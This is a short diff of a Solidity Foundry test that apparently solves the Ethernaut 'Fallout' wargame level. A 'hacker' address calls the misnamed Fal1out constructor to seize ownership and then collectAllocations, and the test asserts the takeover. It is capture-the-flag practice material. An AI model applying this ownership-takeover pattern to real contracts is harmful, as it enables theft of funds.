@@ -21,11 +21,11 @@ function testFallouty() public{
     }
     address hacker = makeAddr("Saad");
     vm.deal(hacker,10 ether);
-    vm.prank(hacker);
+    vm.startPrank(hacker);
  falyout.Fal1out{value:5 ether}();
 
 falyout. collectAllocations();
-
+vm.stopPrank();
 assertEq(address(hacker),falyout.owner());
 
 }
